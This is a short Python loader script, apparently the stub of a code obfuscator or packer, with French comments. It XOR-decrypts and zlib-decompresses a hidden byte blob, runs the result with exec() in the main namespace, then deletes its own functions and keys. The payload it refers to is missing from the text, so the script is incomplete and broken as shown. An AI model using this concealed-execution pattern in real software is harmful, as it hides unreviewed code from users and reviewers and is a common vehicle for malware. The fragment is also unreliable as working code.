_xmKtWeTQYPZ5Wf = bytes([251, 193, 152, 161, 123, 196, 88, 148, 129, 229, 41, 197, 64, 11, 99, 110, 12, 32, 117, 144, 85, 57, 116, 148, 209])
_fkivMb_KneRmIoH = bytes([33, 220, 182, 249, 81, 31, 36, 90, 213, 245, 206, 213, 190, 216, 48, 116, 227, 206, 122, 40, 77, 8, 161, 218, 182])

def _fxxNy64qJs76g5W(_bt8TQLgohrVZd1, _kfJbX5X0etbhp1):
    return bytes(_bt8TQLgohrVZd1[_igtu78BPZ8qE70] ^ _kfJbX5X0etbhp1[_igtu78BPZ8qE70 % len(_kfJbX5X0etbhp1)] for _igtu78BPZ8qE70 in range(len(_bt8TQLgohrVZd1)))

def _fdpSyjQqYbptCU3(_tlfsPaAjax95fO):
    import zlib
    return zlib.decompress(_tlfsPaAjax95fO) # Un seul niveau de zlib ici pour simplifier

def _fedFr1mFnQNDqjo():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xqJfCO8OfgDdKo = _fxxNy64qJs76g5W(_pziHG3M8Of_n0z, _xmKtWeTQYPZ5Wf)
    # 2. Décompression Zlib
    _dfBvDX9XgARS8z = _fdpSyjQqYbptCU3(_xqJfCO8OfgDdKo)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dfBvDX9XgARS8z.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nqzMxh5gZ1SOK_ = _main.__dict__
    _nqzMxh5gZ1SOK_.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nqzMxh5gZ1SOK_)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fedFr1mFnQNDqjo()
try:
    del _fxxNy64qJs76g5W, _fdpSyjQqYbptCU3, _fedFr1mFnQNDqjo
    del _pziHG3M8Of_n0z, _xmKtWeTQYPZ5Wf, _fkivMb_KneRmIoH
except:
    pass
